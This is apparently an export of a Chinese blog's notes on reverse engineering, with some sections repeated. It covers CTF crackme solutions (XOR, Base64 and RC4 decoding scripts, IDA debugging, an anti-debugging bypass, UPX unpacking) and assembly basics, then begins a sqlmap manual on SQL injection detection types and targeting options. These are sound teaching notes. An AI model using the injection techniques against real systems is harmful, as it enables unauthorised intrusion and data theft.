CTFer,Input your flag:\", v5); scanf(\"%s\", Str); for ( i = 0; i \u003c strlen(Str); ++i ) Str[i] ^= i; v3 = strlen(Str); sub_455A94(Str, Str1, v3); if ( !j__strcmp(Str1, \"Zm1jZH9cSVJXT0NFSFJHW09ZU1tVaA==\") ) printf((int)\"you are right!\\n\", v6); else printf((int)\"you are wrong!\\n\", v6); return 0; 我们猜测 sub_455A94(Str, Str1, v3);这个函数就是Base64编码的函数(可以双击进入查看代码) 当然，Base64编码原理并不影响我们解题，直接对主函数中给出的已进行Base64编码的字符串进行还原，得到v3的原始值，随后进行对如下代码的逆运算，即可得到flag for ( i = 0; i \u003c strlen(Str); ++i ) Str[i] ^= i; 完整的c脚本 #include \u003cstdio.h\u003e #include \u003cstring.h\u003e int main() { char Str1[] = \"fmcd\\x7f\\\\IRWOCEHRG[OYS[Uh\"; for (int i = 0; i \u003c strlen(Str1); ++i) { Str1[i] ^= i; } printf(\"%s\", Str1); return 0; 要注意的是，直接用ctf编码工具会将\\x7f\\智能(障)地转换成其他东西，导致下一步的逆向计算得到残缺的flag，为保证数据原汁原味，还是用python里的库进行手动转换吧 import base64 data = base64.b64decode(' ') print (data) ","date":"2023-11-17","objectID":"/reverse-basis1/:0:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x03-base64编码逆向"},{"categories":["Reverse","notes"],"content":"\r0x04 Base64变表逆向跟上一栗子思路一样，无非是把base64标准算法表进行了魔改 对程序里的base64加密过的字符串进行对等位置的替换，用手替换也行，写个脚本替换也行，下面是python脚本 import base64 data = 'Wj1gWE9xPSGUQ0KCPCGET09WR1qSzZ' T4 ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' T5 ='ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/' result='' for ch in data: result += T4[T5.index(ch)] result = bytearray(base64.b64decode(result + \"==\")) for i in range(len(result)): result[i] ^= i print(result) 对result += T4[T5.index(ch)]说明 遍历字符串 data 中的每个字符 ch。 使用 T5.index(ch) 查找字符 ch 在字符映射表 T5 中的位置，返回它在 T5 中的索引。 使用 T4[T5.index(ch)] 找到 T5 中索引对应的字符在 T4 中的映射值。 将 T4[T5.index(ch)] 所对应的字符添加到 result 中。 ​ 要注意的是，data中的等于号(==)是用来补充位数的，在逆向魔改变换的时候未加入，所以在替换之后的result(标准编码表编码的base64)需要添加两个“=”才能进行标准base64表解码 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x04-base64变表逆向"},{"categories":["Reverse","notes"],"content":"\r0x5 IDA 动态调试进行代码审计，可知程序将我们输入的str2与str1的值进行比对， 但str1是固定的，并不受输入影响，而且我们并不知道str1的具体数值 我们可以启用调试功能，当该程序运行到指定位置(通过strcmp函数对比str1和str2比对的位置)时，查看内存中str1的值 在此处代码前方打上断点(快捷键F2)进行调试， 双击进入str1在内存地址中的起始位置，可看到str1的具体数据，这种连续的内存实际上是一个字符串，通过右键进行变换得到拼合起来的flag字符串 对程序中猜测的base64编码函数的真实性验证(动态调试)：可以在程序中任意输入，如123，得到程序反馈的值，再将其与标准base64编码得到的值进行比对，若相同，则该未知命名函数为base64编码函数 下面我们尝试通过动态调试解RC4加密的问题：​ 定位main函数，进行反编译，本次得到的原始代码与以往不同，复杂了很多 ​ 对以判断的函数名进行修改，当我们通过代码审计，没有显而易见的scanf函数，但当运行程序时，却需要我们输入内容，然而那个名为getchar的函数时做教程的师傅猜的(或许是基于经验) ​ 数值10对应的ASCII码是\\n，这里直接让其显示\\n ​ 分析这段代码，可知其使用了一个 do-while 循环，从标准输入中读取字符将其赋值给v8，若读取到了换行字符，则跳出该循环语句，将 v8 存储在字符数组 Str 的下标为 v9 的位置上，并检查 v9 是否小于 44，如果是，则回到第 2 步继续读取字符。 do { v8 = getchar(); if ( v8 == '\\n' ) break; Str[v9++] = v8; } while ( (int)v9 \u003c 44 ); 那我们就输入一个长度为44的字符串 我们可以通过打断点的方式进行动态调试 ​ 在已经判断出的printf函数位置打一个断点，执行调试 ​ 然而，本程序有反调试机制，无法直接调试， ​ 通过代码审计，推测反调试的代码位于printf上面，双击查看(反调试是后面的内容，这里不做展开学习) ​ 该反调试机制只运行一次，需要绕过反调试，我们首先运行该程，当程序输出以下内容时，说明反调试代码已经执行完 ​ 通过调试器的 ‘附加到进程’ 功能，调试一个正在运行的程序，找到相应程序 ok进入调试页面 按F8单步执行，程序在我们打断点的位置停住了，输入内容后程序才能继续执行 传入一个长度为44的字符串 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA input为原来的Str，input_len为原来的v6 当我们传入44个A时，双击input变量，追踪其内存情况 发现其为我们传入的44个A字符串，我们记录一下其首位地址内存00F3F528 传完44个A之后，程序进行跳出原本的for循环，进入下一步，逐一判断这44个字符与v7字符串组是否相同，若相同，则该44个A组成的字符串为flag(显然不是) 让程序运行到返回为止 按G键跳转到指定内存地址00F3F528，发现原本为连续字符串A的地址处，值发生变化 ​ 随后选取原本为A的这44个地址位置，将其转换为16进制字符,即为加密后的数据(本程序是有加密函数，因为其超出本节学习内容，故在前面分析的时候并没有提到)，就是说，我们传入的44个A被程序加密成了下面这行字符串 F60DC6D7B7046F0E890DFD835924E8A599C4C8F92B127FB928E05BA06E336AE4B7FA5542F08D11E578E39BD600 ​ 这时，我们要求算法的逆向，就是通过上述加密后的字符串来得到44个A，要验证改程序的加密和解密是否是同一个过程，需要把上述加密后的数据重新输入到程序中进行加密操作，看能得到什么 ​ 我们重新运行程序，但由于加密后的字符中有些为不可见字符，我们不能直接通过输入上述加密后的字符串来进行验证 ​ 因此我们可以先输入其他字符(如44个1)，先让其填满内存(此时程序已经运行)，再通过修改内存来达到传入上述加密字符串的目的 11111111111111111111111111111111111111111111 ​ 在sub_AFD5B8函数位置打断点 ​ 此时追踪查看input的内存情况 ​ 需要将内存中这些1修改为上述加密过的值，这里用到了一个修改插件(在修改版的LazyIDA中)地址如下 https://github.com/P4nda0s/LazyIDA 修改完成，记录首地址010FF6C4 然后进行单步运行，随后回来看刚才记录的首地址010FF6C4 发现其数据变成了该字符串加密前的44个A, 既然该程序的加密和解密是同一个过程，那想要得到flag，我们只需要将v7里面的数据(加密过的)传入到程序中，即可得到解密的v7数据，即得到flag 这样的话，我们直接追踪v7的内存，将其复制出v7的十六进制数据 E415C4EDA62F5610BB13EBAD7556C7BBBBE9B9CC023A509F369069BE7C4244CAC6D4245CD2B924C11893B3EA 得到了加密后的v7(flag的加密数据)，我们以同样的方式，置换内存中已填入的44位可见字符数据(比如我们依然输入44个1) 然后追踪Str(后来被我们改成input的变量)内存地址，得到解密后的flag数据 双击Str，并将连续的内存选中，转为字符串，即可得到易复制的flag字符串 通过上述步骤，在不写脚本的情况下完成了对RC4加密算法的逆向解密 该逆向手法对其他流密码一样适用 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x5-ida-动态调试"},{"categories":["Reverse","notes"],"content":"\r0x5 IDA 动态调试进行代码审计，可知程序将我们输入的str2与str1的值进行比对， 但str1是固定的，并不受输入影响，而且我们并不知道str1的具体数值 我们可以启用调试功能，当该程序运行到指定位置(通过strcmp函数对比str1和str2比对的位置)时，查看内存中str1的值 在此处代码前方打上断点(快捷键F2)进行调试， 双击进入str1在内存地址中的起始位置，可看到str1的具体数据，这种连续的内存实际上是一个字符串，通过右键进行变换得到拼合起来的flag字符串 对程序中猜测的base64编码函数的真实性验证(动态调试)：可以在程序中任意输入，如123，得到程序反馈的值，再将其与标准base64编码得到的值进行比对，若相同，则该未知命名函数为base64编码函数 下面我们尝试通过动态调试解RC4加密的问题：​ 定位main函数，进行反编译，本次得到的原始代码与以往不同，复杂了很多 ​ 对以判断的函数名进行修改，当我们通过代码审计，没有显而易见的scanf函数，但当运行程序时，却需要我们输入内容，然而那个名为getchar的函数时做教程的师傅猜的(或许是基于经验) ​ 数值10对应的ASCII码是\\n，这里直接让其显示\\n ​ 分析这段代码，可知其使用了一个 do-while 循环，从标准输入中读取字符将其赋值给v8，若读取到了换行字符，则跳出该循环语句，将 v8 存储在字符数组 Str 的下标为 v9 的位置上，并检查 v9 是否小于 44，如果是，则回到第 2 步继续读取字符。 do { v8 = getchar(); if ( v8 == '\\n' ) break; Str[v9++] = v8; } while ( (int)v9 \u003c 44 ); 那我们就输入一个长度为44的字符串 我们可以通过打断点的方式进行动态调试 ​ 在已经判断出的printf函数位置打一个断点，执行调试 ​ 然而，本程序有反调试机制，无法直接调试， ​ 通过代码审计，推测反调试的代码位于printf上面，双击查看(反调试是后面的内容，这里不做展开学习) ​ 该反调试机制只运行一次，需要绕过反调试，我们首先运行该程，当程序输出以下内容时，说明反调试代码已经执行完 ​ 通过调试器的 ‘附加到进程’ 功能，调试一个正在运行的程序，找到相应程序 ok进入调试页面 按F8单步执行，程序在我们打断点的位置停住了，输入内容后程序才能继续执行 传入一个长度为44的字符串 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA input为原来的Str，input_len为原来的v6 当我们传入44个A时，双击input变量，追踪其内存情况 发现其为我们传入的44个A字符串，我们记录一下其首位地址内存00F3F528 传完44个A之后，程序进行跳出原本的for循环，进入下一步，逐一判断这44个字符与v7字符串组是否相同，若相同，则该44个A组成的字符串为flag(显然不是) 让程序运行到返回为止 按G键跳转到指定内存地址00F3F528，发现原本为连续字符串A的地址处，值发生变化 ​ 随后选取原本为A的这44个地址位置，将其转换为16进制字符,即为加密后的数据(本程序是有加密函数，因为其超出本节学习内容，故在前面分析的时候并没有提到)，就是说，我们传入的44个A被程序加密成了下面这行字符串 F60DC6D7B7046F0E890DFD835924E8A599C4C8F92B127FB928E05BA06E336AE4B7FA5542F08D11E578E39BD600 ​ 这时，我们要求算法的逆向，就是通过上述加密后的字符串来得到44个A，要验证改程序的加密和解密是否是同一个过程，需要把上述加密后的数据重新输入到程序中进行加密操作，看能得到什么 ​ 我们重新运行程序，但由于加密后的字符中有些为不可见字符，我们不能直接通过输入上述加密后的字符串来进行验证 ​ 因此我们可以先输入其他字符(如44个1)，先让其填满内存(此时程序已经运行)，再通过修改内存来达到传入上述加密字符串的目的 11111111111111111111111111111111111111111111 ​ 在sub_AFD5B8函数位置打断点 ​ 此时追踪查看input的内存情况 ​ 需要将内存中这些1修改为上述加密过的值，这里用到了一个修改插件(在修改版的LazyIDA中)地址如下 https://github.com/P4nda0s/LazyIDA 修改完成，记录首地址010FF6C4 然后进行单步运行，随后回来看刚才记录的首地址010FF6C4 发现其数据变成了该字符串加密前的44个A, 既然该程序的加密和解密是同一个过程，那想要得到flag，我们只需要将v7里面的数据(加密过的)传入到程序中，即可得到解密的v7数据，即得到flag 这样的话，我们直接追踪v7的内存，将其复制出v7的十六进制数据 E415C4EDA62F5610BB13EBAD7556C7BBBBE9B9CC023A509F369069BE7C4244CAC6D4245CD2B924C11893B3EA 得到了加密后的v7(flag的加密数据)，我们以同样的方式，置换内存中已填入的44位可见字符数据(比如我们依然输入44个1) 然后追踪Str(后来被我们改成input的变量)内存地址，得到解密后的flag数据 双击Str，并将连续的内存选中，转为字符串，即可得到易复制的flag字符串 通过上述步骤，在不写脚本的情况下完成了对RC4加密算法的逆向解密 该逆向手法对其他流密码一样适用 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#对程序中猜测的base64编码函数的真实性验证动态调试"},{"categories":["Reverse","notes"],"content":"\r0x5 IDA 动态调试进行代码审计，可知程序将我们输入的str2与str1的值进行比对， 但str1是固定的，并不受输入影响，而且我们并不知道str1的具体数值 我们可以启用调试功能，当该程序运行到指定位置(通过strcmp函数对比str1和str2比对的位置)时，查看内存中str1的值 在此处代码前方打上断点(快捷键F2)进行调试， 双击进入str1在内存地址中的起始位置，可看到str1的具体数据，这种连续的内存实际上是一个字符串，通过右键进行变换得到拼合起来的flag字符串 对程序中猜测的base64编码函数的真实性验证(动态调试)：可以在程序中任意输入，如123，得到程序反馈的值，再将其与标准base64编码得到的值进行比对，若相同，则该未知命名函数为base64编码函数 下面我们尝试通过动态调试解RC4加密的问题：​ 定位main函数，进行反编译，本次得到的原始代码与以往不同，复杂了很多 ​ 对以判断的函数名进行修改，当我们通过代码审计，没有显而易见的scanf函数，但当运行程序时，却需要我们输入内容，然而那个名为getchar的函数时做教程的师傅猜的(或许是基于经验) ​ 数值10对应的ASCII码是\\n，这里直接让其显示\\n ​ 分析这段代码，可知其使用了一个 do-while 循环，从标准输入中读取字符将其赋值给v8，若读取到了换行字符，则跳出该循环语句，将 v8 存储在字符数组 Str 的下标为 v9 的位置上，并检查 v9 是否小于 44，如果是，则回到第 2 步继续读取字符。 do { v8 = getchar(); if ( v8 == '\\n' ) break; Str[v9++] = v8; } while ( (int)v9 \u003c 44 ); 那我们就输入一个长度为44的字符串 我们可以通过打断点的方式进行动态调试 ​ 在已经判断出的printf函数位置打一个断点，执行调试 ​ 然而，本程序有反调试机制，无法直接调试， ​ 通过代码审计，推测反调试的代码位于printf上面，双击查看(反调试是后面的内容，这里不做展开学习) ​ 该反调试机制只运行一次，需要绕过反调试，我们首先运行该程，当程序输出以下内容时，说明反调试代码已经执行完 ​ 通过调试器的 ‘附加到进程’ 功能，调试一个正在运行的程序，找到相应程序 ok进入调试页面 按F8单步执行，程序在我们打断点的位置停住了，输入内容后程序才能继续执行 传入一个长度为44的字符串 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA input为原来的Str，input_len为原来的v6 当我们传入44个A时，双击input变量，追踪其内存情况 发现其为我们传入的44个A字符串，我们记录一下其首位地址内存00F3F528 传完44个A之后，程序进行跳出原本的for循环，进入下一步，逐一判断这44个字符与v7字符串组是否相同，若相同，则该44个A组成的字符串为flag(显然不是) 让程序运行到返回为止 按G键跳转到指定内存地址00F3F528，发现原本为连续字符串A的地址处，值发生变化 ​ 随后选取原本为A的这44个地址位置，将其转换为16进制字符,即为加密后的数据(本程序是有加密函数，因为其超出本节学习内容，故在前面分析的时候并没有提到)，就是说，我们传入的44个A被程序加密成了下面这行字符串 F60DC6D7B7046F0E890DFD835924E8A599C4C8F92B127FB928E05BA06E336AE4B7FA5542F08D11E578E39BD600 ​ 这时，我们要求算法的逆向，就是通过上述加密后的字符串来得到44个A，要验证改程序的加密和解密是否是同一个过程，需要把上述加密后的数据重新输入到程序中进行加密操作，看能得到什么 ​ 我们重新运行程序，但由于加密后的字符中有些为不可见字符，我们不能直接通过输入上述加密后的字符串来进行验证 ​ 因此我们可以先输入其他字符(如44个1)，先让其填满内存(此时程序已经运行)，再通过修改内存来达到传入上述加密字符串的目的 11111111111111111111111111111111111111111111 ​ 在sub_AFD5B8函数位置打断点 ​ 此时追踪查看input的内存情况 ​ 需要将内存中这些1修改为上述加密过的值，这里用到了一个修改插件(在修改版的LazyIDA中)地址如下 https://github.com/P4nda0s/LazyIDA 修改完成，记录首地址010FF6C4 然后进行单步运行，随后回来看刚才记录的首地址010FF6C4 发现其数据变成了该字符串加密前的44个A, 既然该程序的加密和解密是同一个过程，那想要得到flag，我们只需要将v7里面的数据(加密过的)传入到程序中，即可得到解密的v7数据，即得到flag 这样的话，我们直接追踪v7的内存，将其复制出v7的十六进制数据 E415C4EDA62F5610BB13EBAD7556C7BBBBE9B9CC023A509F369069BE7C4244CAC6D4245CD2B924C11893B3EA 得到了加密后的v7(flag的加密数据)，我们以同样的方式，置换内存中已填入的44位可见字符数据(比如我们依然输入44个1) 然后追踪Str(后来被我们改成input的变量)内存地址，得到解密后的flag数据 双击Str，并将连续的内存选中，转为字符串，即可得到易复制的flag字符串 通过上述步骤，在不写脚本的情况下完成了对RC4加密算法的逆向解密 该逆向手法对其他流密码一样适用 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:5","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#下面我们尝试通过动态调试解rc4加密的问题"},{"categories":["Reverse","notes"],"content":"\r0x6 IDA 代码修复入门程序在编译阶段会丢失很多信息，把低级语言转为高级语言，由于信息补全，IDA会生成一些不合理的代码 strstr(str1,str2) 函数用于判断字符串str2是否是str1的子串。如果是，则该函数返回 str1字符串从 str2第一次出现的位置开始到 str1结尾的字符串；否则，返回NULL。 数组修复分为以下情况： 数组指针修复 数组数据修复 ​ 数组指针修复是指修正指向数组指针的类型，IDA可能将一些指针变量识别成整数变量 ​ 数组数据修复是指修复数组实际数据定义处的类型，数组实体可能存放在栈中，也可能存放在去全局数据段 (字符串也是数组) 这节课主打的是实战分析，没有太多新知识点 ","date":"2023-11-17","objectID":"/reverse-basis1/:0:6","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x6-ida-代码修复入门"},{"categories":["Reverse","notes"],"content":"\r0x7 UPX脱壳处理加壳，程序的一种保护机制，防止被逆向 UPX是一种开源的压缩壳 https://github.com/upx/upx/releases 加壳可执行文件：upx.exe sample.exe 脱壳可执行文件：upx.exe -d sample.exe 手动脱壳的目标： 1.找到原始程序入口地址(OEP) 2.在原始程序入口地址处设置硬件断点(下次调试可快速进入原始代码，硬件断点不会修改数据) 进阶目标： 脱壳到文件，并修复运行 远程Linux动态调试​ 使用IDA文件夹里面的dbsrv/linux_server64，把这个文件传入Linux系统并运行(这里我用的是Ubuntu)，回到IDA程序，在调试器里面选择远程Linux动态调试，输入远程Linux的IP地址和密码即可连接(端口号一般是默认的) ​ 关于IDA远程Linux动态调试这里不做详细展开，可以百度看详细教程。 ​ ​ retn是一条返回指令，相当于C语言的return，按F4让程序执行到此位置 ​ call指令进行函数调用 这里插一句，IDA的调试快捷键 使用f7 调试的时候遇到方法体的时候会进入到方法体内部 每个方法依次执行 使用f8 调试的时候 遇到方法体不会进入方法内部 只会依次执行 使用f9 调试的时候 只会执行 打断点的地方 OKAY，我们貌似找到了真正程序的入口 按F7跳转入该方法内部查看 ​ 进入某一块地址之后，IDA可能将代码识别生成数据，我们可以按C快捷键，将其转化为代码，随后按P创建函数，之后就可以按F5进行反编译随后就根据以往的流程进行逆向。 ​ ","date":"2023-11-17","objectID":"/reverse-basis1/:0:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#0x7-upx脱壳处理"},{"categories":["Reverse","notes"],"content":"\r0x7 UPX脱壳处理加壳，程序的一种保护机制，防止被逆向 UPX是一种开源的压缩壳 https://github.com/upx/upx/releases 加壳可执行文件：upx.exe sample.exe 脱壳可执行文件：upx.exe -d sample.exe 手动脱壳的目标： 1.找到原始程序入口地址(OEP) 2.在原始程序入口地址处设置硬件断点(下次调试可快速进入原始代码，硬件断点不会修改数据) 进阶目标： 脱壳到文件，并修复运行 远程Linux动态调试​ 使用IDA文件夹里面的dbsrv/linux_server64，把这个文件传入Linux系统并运行(这里我用的是Ubuntu)，回到IDA程序，在调试器里面选择远程Linux动态调试，输入远程Linux的IP地址和密码即可连接(端口号一般是默认的) ​ 关于IDA远程Linux动态调试这里不做详细展开，可以百度看详细教程。 ​ ​ retn是一条返回指令，相当于C语言的return，按F4让程序执行到此位置 ​ call指令进行函数调用 这里插一句，IDA的调试快捷键 使用f7 调试的时候遇到方法体的时候会进入到方法体内部 每个方法依次执行 使用f8 调试的时候 遇到方法体不会进入方法内部 只会依次执行 使用f9 调试的时候 只会执行 打断点的地方 OKAY，我们貌似找到了真正程序的入口 按F7跳转入该方法内部查看 ​ 进入某一块地址之后，IDA可能将代码识别生成数据，我们可以按C快捷键，将其转化为代码，随后按P创建函数，之后就可以按F5进行反编译随后就根据以往的流程进行逆向。 ​ ","date":"2023-11-17","objectID":"/reverse-basis1/:0:7","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis1","uri":"/reverse-basis1/#远程linux动态调试"},{"categories":["Reverse","notes"],"content":"reverse基础2 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:0","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#"},{"categories":["Reverse","notes"],"content":"\r0x1 基本汇编指令 mov A B 将B的值复制到A里面去 push A 将A压栈 pop A 将A从栈中弹出来 call Funtion 跳转到某函数 ret –\u003e 相当于 pop ip 从栈中pop出一个值放到EIP里面 je jz **如果ZF（0标志位）=1，就跳转，否则跳过这条语句，执行下面的语句。 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:1","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x1-基本汇编指令"},{"categories":["Reverse","notes"],"content":"\r0x2 栈\u0026栈帧​ 堆栈，就是计算机暂时储存的地方，固定的一端称之为栈底，变化的一端称之为栈顶 ​ 栈的原则：先进后出，后进先出 ​ 栈帧也叫过程活动记录，是编译器用来实现过程/函数调用的一种数据结构。 ​ C语言中，每个栈帧对应着一个未运行完的函数。栈帧中保存了该函数的返回地址和局部变量。 ​ 函数每次调用，都有它自己独立的栈帧。栈帧中维持着函数调用所需要的各种信息，包括函数的传入，函数的局部变量、函数执行完成后下一步要执行的指令地址、寄存器信息等。 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:2","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x2-栈栈帧"},{"categories":["Reverse","notes"],"content":"\r0x3 运行时栈​ 栈帧使用了栈这一数据结构，达到了后进先出(First In Last Out)的内存管理原则。不管是插入数据还是删除数据，都是在栈顶进行的。 ​ x86-64的栈由高地址向低地址增长，寄存器rbp指向当前栈帧的底部(高地址)，寄存器rsp指向当前栈帧的顶部(低地址)。数据压栈和出栈会修改rsp的值。通过push指令将数据存入栈中，同时64位系统中会对栈顶指针做减法操作rsp=rsp-8。pop指令是push的逆操作，它将数据从栈中读取出来，同时64位系统中会对栈顶指针做加法操作rsp=rsp+8 ​ 当过程P调用过程Q时， ​ 1.把实参压栈，cdecl是gcc的默认调用约定，实参压栈顺序为从右至左 ​ 2.把返回地址(即P调用Q后的下一条指令地址)压入栈中，表示当Q返回后，P程序下一步要从那条指令开始运行 ​ 3.开始调用Q，首先将P的栈底rbp压栈，然后栈顶rsp赋值给rbp，从而形成新的栈底地址。我们再看函数调用的汇编代码时，经常看到的一段正是在做这个操作 push rbp mov rbp,rsp ​ 4.分配局部变量空间，开始具体执行Q函数的指令代码 ","date":"2023-11-17","objectID":"/reverse-basis2/:0:3","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x3-运行时栈"},{"categories":["Reverse","notes"],"content":"\r0x3 转移控制​ 将控制从函数P转移到函数Q只需要将程序计数器(PC)设置为Q函数代码的起始位置。另外，稍后从Q返回时处理器还需要继续执行P的下一条指令A。在x86-64中，这个过程是用执行call Q指令来完成的。该指令将A的地址压栈，并将PC设置为Q的起始地址。 ​ Q执行完成后弹出A地址这个过程是通过ret指令完成的，它会弹出地址A，并把PC设置为A #include\u003ciostream\u003e #include\u003cstdint.h\u003e int32_t Add(int32_t x,int32_t y) { int32_t z=0; z=x+y; return z; } int main() { int32_t a=10; int32_t b=20; int32_t ret=Add(a,b); return 0; } 经过编译后，再进行反汇编，如下是汇编代码 #include\u003ciostream\u003e #include\u003cstdint.h\u003e int32_t Add(int32_t x,int32_t y) // push rbp // mov rbp, rsp // mov DWORD PTR [rbp-20], edi // mov DWORD PTR [rbp-24], esi { int32_t z=0; // mov DWORD PTR [rbp-4], 0 z=x+y; // mov edx, DWORD PTR [rbp-20] // mov eax, DWORD PTR [rbp-24] // add eax, edx // mov DWORD PTR [rbp-4], eax return z; // mov eax, DWORD PTR [rbp-4] } // pop rbp // ret int main() { // push rbp // mov rbp, rsp // sub rsp, 16 int32_t a=10; // mov DWORD PTR [rbp-4], 10 int32_t b=20; // mov DWORD PTR [rbp-8], 20 int32_t ret=Add(a,b); // mov edx, DWORD PTR [rbp-8] // mov eax, DWORD PTR [rbp-4] // mov esi, edx // mov edi, eax // call Add(int, int) // mov DWORD PTR [rbp-12], eax return 0; } 当main函数调用了add时，执行了以下步骤： Add(int, int): // 5. 将main函数的栈帧底部地址入栈保存 push rbp // 6. 将此时的栈帧顶部地址作为Add函数的栈帧底部地址 mov rbp, rsp // 7. 获取形参x mov DWORD PTR [rbp-20], edi // 8. 获取形参y mov DWORD PTR [rbp-24], esi // 9. 初始化z=0 mov DWORD PTR [rbp-4], 0 // 10. 将x和y分别保存至寄存器edx和eax，然后相加，结果保存在寄存器eax mov edx, DWORD PTR [rbp-20] mov eax, DWORD PTR [rbp-24] add eax, edx // 11. 将寄存器eax中的x和y相加结果赋值给z mov DWORD PTR [rbp-4], eax // 12. 将Add函数结果z保存至寄存器eax mov eax, DWORD PTR [rbp-4] // 13. 将之前保存的main函数栈帧底部地址出栈并保存至rbp pop rbp // 14. 相当于pop eip 将之前保存的mov DWORD PTR [rbp-12], eax指令地址出栈并保存至eip ret main: push rbp mov rbp, rsp sub rsp, 16 // 1. 初始化a=10 mov DWORD PTR [rbp-4], 10 // 2. 初始化b=20 mov DWORD PTR [rbp-8], 20 // 3. 分别将a和b保存至寄存器eax和edx，再分别拷贝至寄存器edi和dsi mov edx, DWORD PTR [rbp-8] mov eax, DWORD PTR [rbp-4] mov esi, edx mov edi, eax // 4. 等价于两条命令 // ① push eip 将eip中存储的下一条指令地址压栈，即mov DWORD PTR [rbp-12], eax这条指令 // ② jmp Add(int,int) 跳转至Add(int,int) call Add(int, int) // 15. 将Add函数返回结果保存至ret mov DWORD PTR [rbp-12], eax ","date":"2023-11-17","objectID":"/reverse-basis2/:0:4","series":null,"tags":["Reverse","notes"],"title":"Reverse-Basis2","uri":"/reverse-basis2/#0x3-转移控制"},{"categories":["manual"],"content":"sqlmap常用命令手册 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:0:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#"},{"categories":["manual"],"content":"\rsqlmap简介： sqlmap是一款开源免费的漏洞检查、利用工具. 可以检测页面中get,post参数,cookie,http头等. 可以实现数据榨取 可以实现文件系统的访问 可以实现操作命令的执行 还可以对xss漏洞进行检测 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:1:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#sqlmap简介"},{"categories":["manual"],"content":"\rsqlmap 支持5种漏洞检测类型: 基于布尔的盲注检测 (如果一个url的地址为xxxx.php?id=1,那么我们可以尝试下的加上 and 1=1(和没加and1=1结果保持一致) 和 and 1=2(和不加and1=2结果不一致),则我们基本可以确定是存在布尔注入的. ) 基于时间的盲注检测(和基于布尔的检测有些类似.通过mysql的 sleep(int)) 来观察浏览器的响应是否等待了你设定的那个值 如果等待了,则表示执行了sleep,则基本确定是存在sql注入的 基于错误的检测 (组合查询语句,看是否报错(在服务器没有抑制报错信息的前提下),如果报错 则证明我们组合的查询语句特定的字符被应用了,如果不报错,则我们输入的特殊字符很可能被服务器给过滤掉(也可能是抑制了错误输出.)) 基于union联合查询的检测(适用于如果某个web项目对查询结果只展示一条而我们需要多条的时候 则使用union联合查询搭配concat还进行获取更多的信息) 基于堆叠查询的检测(首先看服务器支不支持多语句查询,一般服务器sql语句都是写死的,某些特定的地方用占位符来接受用户输入的变量,这样即使我们加and 也只能执行select(也不一定select,主要看应用场景,总之就是服务端写了什么,你就能执行什么)查询语句,如果能插入分号;则我们后面可以自己组合update,insert,delete等语句来进行进一步操作) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:2:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#sqlmap-支持5种漏洞检测类型"},{"categories":["manual"],"content":"\roption类：　sqlmap –version 查看sqlmap版本信息. -h　查看功能参数(常用的) -hh　查看所有的参数 (如果有中文包 就最好了) -v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细. ​ Target(指定目标): -d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接. -u　指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 -l　指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描 -x　以xml的形式提交一个站点地图给sqlmap(表示不理解..) -m　如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描 -r　把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体 -g　利用谷歌搜索引擎搭配正则来过滤你想要的 -c　加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描 ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:3:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#option类"},{"categories":["manual"],"content":"\r扫描类型：","date":"2023-11-17","objectID":"/sqlmap_common_commands/:4:0","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#扫描类型"},{"categories":["manual"],"content":"\rget扫描：　-u 指定一个带参数的url地址进行扫描. -p 只对特定的参数进行扫描(我们知道,page等是用不到的,在这串url中,只有password和username是有价值的信息,所以我们只对username进行扫描) ","date":"2023-11-17","objectID":"/sqlmap_common_commands/:4:1","series":null,"tags":["manual"],"title":"sqlmap常用命令","uri":"/sqlmap_common_commands/#get扫描"},{"categories":["manual"],"content":"\rpost扫描：sqlmap 支持2种post 扫描： 1.请求文件. 2.busp suite log文件 